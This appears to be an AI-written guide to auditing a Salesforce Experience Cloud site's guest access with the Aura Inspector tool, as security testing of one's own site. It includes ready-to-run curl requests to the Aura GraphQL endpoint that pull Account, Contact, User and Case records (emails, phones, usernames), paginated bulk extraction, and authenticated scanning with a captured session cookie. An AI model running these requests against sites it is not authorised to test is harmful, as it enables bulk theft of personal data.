# Aura Inspector Complete Guide

Here is a complete, step-by-step guide to setting up and using the **Aura Inspector** tool on your Windows work laptop to perform an in-depth analysis of a live Salesforce Experience Cloud site.

This setup focuses on testing the **Guest (Unauthenticated)** perspective, which is critical for finding data exposed to the public internet that shouldn't be.

---

### Step 1: Set Up Your Laptop
To use the tool, you will need **Python 3** and **Git** installed on your laptop.

Open an elevated terminal (Windows PowerShell or Command Prompt) and run the following commands to create your workspace, clone the repository, and install the dependencies:

```powershell
# 1. Create a working directory and enter it
mkdir C:\Code\Salesforce-Audit
cd C:\Code\Salesforce-Audit

# 2. Clone the Aura Inspector repository from Google
git clone https://github.com/google/aura-inspector.git
cd aura-inspector

# 3. Create an isolated Python virtual environment
python -m venv env

# 4. Activate the virtual environment
# (You must run this command every time you open a new terminal to use the tool)
.\env\Scripts\activate

# 5. Install the required Python packages
pip install -r requirements.txt
```

---

### Step 2: Run a Complete Guest Analysis
To test what a **Unauthenticated Guest User** has access to, you run the tool without providing any cookies or session tokens.

Run the tool targeting your live site and save the results cleanly into an output directory. 

```powershell
python src\aura_cli.py -u https://your-live-site.my.site.com -o results_guest
```

**What the tool does automatically during this sweep:**
1. **Aura Endpoint Discovery:** It attempts to find the correct application routing (e.g., `/s/sfsites/aura`).
2. **Action Bulking:** To speed up the search without triggering rate limits, it batches up to 100 object permission queries at a time.
3. **Permission Mapping:** It checks over 200 standard and custom objects to see if Guest users have read access.
4. **GraphQL Bypassing:** It runs hidden UI API GraphQL queries to verify if objects are accessible without hitting the standard 2,000 record limits limit.
5. **Self-Registration Check:** It checks if public user creation is misconfigured and left open.

---

### Step 3: Analyze the Output (Which Data is Exposed?)

Once the command finishes, navigate into the output directory you specified (`results_guest`). 

You will find the following structure:
* **`records/summary.txt`** - Contains a list of objects accessible using standard Aura calls and the total count of exposed records.
* **`gql_records/summary.txt`** - Contains a list of objects accessible using the undocumented GraphQL Aura controllers and their counts.
* **`misc/`** - Extra misconfigurations like trusted external sites or leaked "Home URLs" that might give a guest access to admin panels.

**Crucial Note on Extracting the "Actual Data":**
As described by Mandiant, the public version of Aura Inspector **intentionally does not download the actual records (the raw data contents)** to prevent malicious data-scraping misuse. It only flags the **Object Names** (e.g., `Account`, `Contact`, `Opportunity`, `User`) and **How many records are exposed**.

#### How to see the actual fields being leaked:
If the tool tells you that the `Account` object has 1,500 exposed records in `summary.txt`, you can use **cURL** to reconstruct the exact GraphQL request that reproduces the leak and shows you the actual data.

Open your terminal and run the following matching the target URL and the **Object Name** the tool flagged. Below are examples for common objects like `Account`, `Contact`, `User`, and `Case`.

##### Extracting `Account` (First 10 Records)
```powershell
curl -X POST "https://your-live-site.my.site.com/s/sfsites/aura" `
  -H "Content-Type: application/x-www-form-urlencoded" `
  -d 'message={"actions":[{"id":"GraphQL","descriptor":"aura://RecordUiController/ACTION$executeGraphQL","callingDescriptor":"markup://forceCommunity:richText","params":{"queryInput":{"operationName":"accounts","query":"query+accounts+{uiapi+{query+{Account(first:10){edges+{node+{+Name+{+value+}}}}}}}}","variables":{}}},"version":"64.0","storable":true}]}' `
  -d "aura.context={'mode':'PROD','app':'siteforce:communityApp'}&aura.token=null"
```

##### Extracting `Account` (All Records up to 2,000 using Pagination Cursor)
*If you need to retrieve all records in large batches (up to 2,000 at a time), you change `(first:10)` to `(first:2000)` and add `pageInfo{endCursor,hasNextPage}` so you can paginate if there are more than 2,000 records.*

```powershell
curl -X POST "https://your-live-site.my.site.com/s/sfsites/aura" `
  -H "Content-Type: application/x-www-form-urlencoded" `
  -d 'message={"actions":[{"id":"GraphQL","descriptor":"aura://RecordUiController/ACTION$executeGraphQL","callingDescriptor":"markup://forceCommunity:richText","params":{"queryInput":{"operationName":"accounts","query":"query+accounts+{uiapi+{query+{Account(first:2000){edges+{node+{+Name+{+value+}}}pageInfo{endCursor,hasNextPage}}}}}","variables":{}}},"version":"64.0","storable":true}]}' `
  -d "aura.context={'mode':'PROD','app':'siteforce:communityApp'}&aura.token=null"
```
*(If `hasNextPage` is true, take the `endCursor` string and run the query again by passing it like this: `Account(first:2000, after:"your_cursor_here")`)*

##### Extracting `Contact`
```powershell
curl -X POST "https://your-live-site.my.site.com/s/sfsites/aura" `
  -H "Content-Type: application/x-www-form-urlencoded" `
  -d 'message={"actions":[{"id":"GraphQL","descriptor":"aura://RecordUiController/ACTION$executeGraphQL","callingDescriptor":"markup://forceCommunity:richText","params":{"queryInput":{"operationName":"contacts","query":"query+contacts+{uiapi+{query+{Contact(first:10){edges+{node+{+Name+{+value+},+Email+{+value+},+Phone+{+value+}}}}}}}}","variables":{}}},"version":"64.0","storable":true}]}' `
  -d "aura.context={'mode':'PROD','app':'siteforce:communityApp'}&aura.token=null"
```

##### Extracting `User`
```powershell
curl -X POST "https://your-live-site.my.site.com/s/sfsites/aura" `
  -H "Content-Type: application/x-www-form-urlencoded" `
  -d 'message={"actions":[{"id":"GraphQL","descriptor":"aura://RecordUiController/ACTION$executeGraphQL","callingDescriptor":"markup://forceCommunity:richText","params":{"queryInput":{"operationName":"users","query":"query+users+{uiapi+{query+{User(first:10){edges+{node+{+Name+{+value+},+Username+{+value+},+Email+{+value+}}}}}}}}","variables":{}}},"version":"64.0","storable":true}]}' `
  -d "aura.context={'mode':'PROD','app':'siteforce:communityApp'}&aura.token=null"
```

##### Extracting `Case`
```powershell
curl -X POST "https://your-live-site.my.site.com/s/sfsites/aura" `
  -H "Content-Type: application/x-www-form-urlencoded" `
  -d 'message={"actions":[{"id":"GraphQL","descriptor":"aura://RecordUiController/ACTION$executeGraphQL","callingDescriptor":"markup://forceCommunity:richText","params":{"queryInput":{"operationName":"cases","query":"query+cases+{uiapi+{query+{Case(first:10){edges+{node+{+CaseNumber+{+value+},+Subject+{+value+},+Status+{+value+}}}}}}}}","variables":{}}},"version":"64.0","storable":true}]}' `
  -d "aura.context={'mode':'PROD','app':'siteforce:communityApp'}&aura.token=null"
```

##### Extracting `User_Access_Request__c` (Custom Object)
```powershell
curl -X POST "https://your-live-site.my.site.com/s/sfsites/aura" `
  -H "Content-Type: application/x-www-form-urlencoded" `
  -d 'message={"actions":[{"id":"GraphQL","descriptor":"aura://RecordUiController/ACTION$executeGraphQL","callingDescriptor":"markup://forceCommunity:richText","params":{"queryInput":{"operationName":"custom_object","query":"query+custom_object+{uiapi+{query+{User_Access_Request__c(first:10){edges+{node+{+Name+{+value+},+Id+{+value+}}}}}}}}","variables":{}}},"version":"64.0","storable":true}]}' `
  -d "aura.context={'mode':'PROD','app':'siteforce:communityApp'}&aura.token=null"
```

*Change the Object inside the `query` above if you find other leaked tables (like `Opportunity` or custom objects ending in `__c`). This will return a JSON blob containing the first 10 records and their specific fields.*

### Step 4: Visual UI Checks (Record Lists and Home URLs)
Beyond data extraction, Aura Inspector inherently searches for two vulnerabilities linked directly to exposed web UI interfaces.

Check your `results_guest/misc/` folder to see if these files exist:
1. **`record_ui_list.json`** - Lists accessible "Record Lists" (Visual matrix UI tables developers build out). If URLs are populated here, copy-paste them straight into your browser to visually see exposed data tables natively without querying.
2. **`object_home_urls.json`** - Lists unprotected "Home URLs". External plugins often generate Admin or overview dashboards at URLs like `/s/spark-admin`. If these populate and load for a Guest user, it indicates huge configuration flaws in external integrations.

---

### Step 5: Advanced Scans & Authenticated Testing
Sometimes standard generic scans miss custom applications built onto the instance. 

**Custom Sub-Directories and App Routing (`--app`)**
If you notice your site uses custom URL paths (e.g., `https://partners.your-custom-domain.com/myCustomApp/s`), the standard tooling default of `/s` will fail to extract everything. You should force the tool to explicitly target those paths instead.

```powershell
python src\aura_cli.py -u https://partners.your-custom-domain.com/myCustomApp/s --app /myCustomApp/s -o results_custom_app
```

**Testing Custom Endpoints or Proxies (`--aura`)**
If your custom site employs a Web Application Firewall (WAF) or masks its API endpoints, you might need to manually trace where network requests are routing in your browser and pass the direct API path:
```powershell
python src\aura_cli.py -u https://partners.your-custom-domain.com/myCustomApp/s --app /myCustomApp/s --aura /myCustomApp/s/sfsites/aura -o results_custom_app
```

**Testing as a Standard Authenticated User:**
If you acquire standard user login credentials for the community portal, you should absolutely re-run this tool from an authenticated viewpoint to test for internal privilege escalation. Obtain your `SID` cookie using your browser's dev tools or Burp Suite.

```powershell
python src\aura_cli.py -u https://your-live-site.my.site.com -c "sid=00Dxx...; " -o results_authenticated
```
